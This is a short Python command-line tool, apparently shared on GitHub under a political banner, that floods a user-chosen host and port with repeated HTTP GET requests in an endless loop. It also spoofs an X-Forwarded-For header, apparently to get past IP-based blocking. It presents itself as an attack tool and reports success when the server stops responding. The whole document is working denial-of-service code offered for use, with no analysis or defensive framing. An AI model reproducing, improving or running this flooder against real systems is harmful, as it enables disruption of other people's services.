import sys
import os
import socket
import time
    
banner = "\n\n\
     {F}{R}{E}{E} • (2)(0)(2)(6)\n\
     {P}{A}{L}{E}{S}{T}{I}{N}{E}\n\
           Github: @Mika259\n\
\
         Your maybe getting hot\n\
        when running this attack.\
\
"
vers = "1.0"

clear = "clear" if os.name == "posix" else "cls"
    
c = lambda: os.system(clear)  
run = True
host = 'none'
port = 'none'

def get_info():
    return f"""Hostname: {host}\nPort    : {port}"""

def edit_target():
    global host, port
    host = input("Host: ")
    try:
        port = int(input("Port: ")) 
    except ValueError:
        print("Port only be number!")
        time.sleep(3)
        c()
        print("Port only be number!")
        edit_target()
    
def start_attack():
    if host == 'none' or port == 'none':
        print("Edit target information before attack.")
        return
    ip = host
    pr = int(port)
    i = 1
    try:
        while True:
            s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            s.connect((ip,pr))
            s.sendall(
                f"GET / HTTP/1.1\r\n"
                f"Host: {ip}\r\n"
                f"X-Forwarded-For: 127.0.0.1\r\n"
                f"Connection: close\r\n\r\n"
                .encode()
            )
            print(f"Send packet {i}")
            i += 1
    except ConnectionRefusedError:
        s.close()
        print("Server down! or You have been blocked.")
    resp = b""

    while True:
        data = s.recv(1024)
        if not data:
            break
        resp += data
    header, body = resp.split(b"\r\n\r\n", 1)
    print(body.decode())
  
def main():
    global run
    print("\n\t(1) Show target\n\t(2) Edit target\n\t(3) Star attacking\n\n")
    ch = input(" choose > ")
    match ch:
        case '1':
            c()
            print("Target Information")
            print(get_info())
        case '2':
            c()
            print("Edit target")
            edit_target()
        case '3':
            print("start attacking!")
            start_attack()
        case _:
            print("Invalid choice")
        
    

while run:
    print(banner+"\n")
    main()
